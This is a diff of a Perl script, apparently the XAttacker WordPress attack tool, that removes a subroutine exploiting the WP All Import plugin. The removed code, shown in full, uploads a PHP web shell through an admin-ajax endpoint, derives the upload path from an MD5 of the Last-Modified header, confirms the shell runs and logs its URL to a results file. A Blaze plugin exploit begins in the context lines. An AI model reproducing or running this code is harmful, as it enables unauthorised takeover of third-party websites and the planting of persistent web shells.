@@ -280,42 +280,6 @@ print color('bold red'),"NOt VULN";
 print color('bold white'),"\n";}
 }
 
-################ WP All Import #####################
-sub wpallimport(){
-my $allimporturl = "$site/wp-admin/admin-ajax.php?page=pmxi-admin-settings&action=upload&name=XAttacker.php";
-my $wpallimportres = $ua->post($allimporturl, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"]]);
-my $date = $wpallimportres->header('Last-Modified');
-$strtime = md5_hex(str2time("$date"));
-$wpallimportup = "$site/wp-content/uploads/wpallimport/uploads/$strtime/XAttacker.php?X=Attacker";
-my $checkwpallimport = $ua->get("$wpallimportup")->content;
-if($checkwpallimport =~ /X Attacker/){
-print color('bold red'),"[";
-print color('bold green'),"+";
-print color('bold red'),"] ";
-print color('bold white'),"WP All Import";
-print color('bold white')," ..................... ";
-print color('bold white'),"";
-print color('bold green'),"VULN";
-print color('bold white'),"\n";
-print color('bold green')," [";
-print color('bold red'),"+";
-print color('bold green'),"] ";
-print color('bold white'),"Shell Uploaded Successfully\n";
-print color('bold white'),"  [Link] => $wpallimportup\n";
-open (TEXT, '>>Result/Shells.txt');
-print TEXT "$wpallimportup\n";
-close (TEXT);
-}else{
-print color('bold red'),"[";
-print color('bold green'),"+";
-print color('bold red'),"] ";
-print color('bold white'),"WP All Import";
-print color('bold white')," ..................... ";
-print color('bold red'),"NOt VULN";
-print color('bold white'),"\n";
-}
-}
-
 ################ Blaze #####################
 sub blaze(){
 my $url = "$site/wp-admin/admin.php?page=blaze_manage";
